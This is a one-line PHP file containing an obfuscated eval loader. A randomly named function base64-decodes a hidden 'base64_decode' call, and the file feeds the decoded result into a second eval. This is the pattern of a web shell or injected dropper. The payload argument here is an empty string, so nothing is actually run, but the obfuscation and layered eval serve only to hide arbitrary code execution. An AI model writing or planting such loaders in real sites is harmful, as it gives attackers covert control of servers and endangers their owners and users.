<?php function EvSVtivLoVWjtjiAXfDy($HQTQQptPwn){$r=base64_decode("YmFzZTY0X2RlY29kZSgkSFFUUVFwdFB3bik=");return eval("return $r;");} eval('?>'.EvSVtivLoVWjtjiAXfDy('').'<?php '); ?>